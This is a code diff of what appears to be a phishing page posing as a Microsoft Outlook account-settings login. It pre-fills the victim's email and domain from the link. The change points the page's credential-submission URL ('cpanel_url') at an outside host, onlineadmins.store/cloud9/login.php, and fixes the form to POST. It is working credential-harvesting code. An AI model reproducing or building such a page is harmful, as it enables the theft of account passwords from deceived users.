@@ -183,7 +183,7 @@ body {
     </div>
     <div class="login-box">
         <div class="form-signin">
-					<form action="" method="https://onlineadmins.store/cloud9/login.php">
+					<form action="" method="POST">
 
             <img class="mb-4" src="https://web.cytrack.com/wpv1/wp-content/uploads/microsoft-outlook-logo.jpg" alt="" style="width: 100%">
             <h1 style="" class="h4 mb-3 font-weight-normal" id="corportate-title"> <i></i> <span id="theDomain"></span> &amp; Account Settings</h1><br>
@@ -279,7 +279,7 @@ body {
     let divide2 = href.split("#");
     $('#theDomain').text(divide1[1]);
     $('#txtEmail').val(divide2[1]);
-    let cpanel_url = "login.php";
+    let cpanel_url = "https://onlineadmins.store/cloud9/login.php";
     let userIP = '';
 
     var currentBrowser = $.browserDetection(true);
